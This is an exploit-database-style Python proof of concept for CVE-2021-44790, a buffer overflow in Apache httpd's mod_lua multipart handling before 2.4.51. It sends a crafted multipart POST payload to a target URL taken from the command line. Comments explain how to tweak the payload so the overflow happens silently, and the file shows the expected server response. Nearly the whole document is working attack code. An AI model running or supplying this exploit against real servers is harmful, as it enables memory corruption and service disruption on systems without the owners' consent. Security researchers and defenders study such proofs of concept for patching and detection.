# Exploit Title: Apache 2.4.x - Buffer Overflow
# Date: Jan 2 2023
# Exploit Author: Sunil Iyengar
# Vendor Homepage: https://httpd.apache.org/
# Software Link: https://archive.apache.org/dist/httpd/
# Version: Any version less than 2.4.51. Tested on 2.4.50 and 2.4.51
# Tested on: (Server) Kali, (Client) MacOS Monterey
# CVE : CVE-2021-44790

import sys
import requests

#Example "http(s)://<hostname>/process.lua"

url = "http(s)://<hostname>/<luafile>"



url = sys.argv[1]  # Usage: python3 51193.py http://olympus.thm/~webmaster/index.php





payload = "4\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n0\r\n4\r\n"
headers = {
  'Content-Type': 'multipart/form-data; boundary=4'
}

#Note1: The value for boundary=4, in the above example, is arbitrary. It can be anything else like 1.
# But this has to match with the values in Payload.

#Note2: The form data as shown above returns the response as "memory allocation error: block too big".
# But one can change the payload to name=\"name\"\r\n\r\n\r\n4\r\n" and not get the error but on the lua module overflows
# 3 more bytes during memset

response = requests.request("POST", url, headers=headers, data=payload)

print(response.text)

#Response returned is
#<h3>Error!</h3>
#<pre>memory allocation error: block too big</pre>
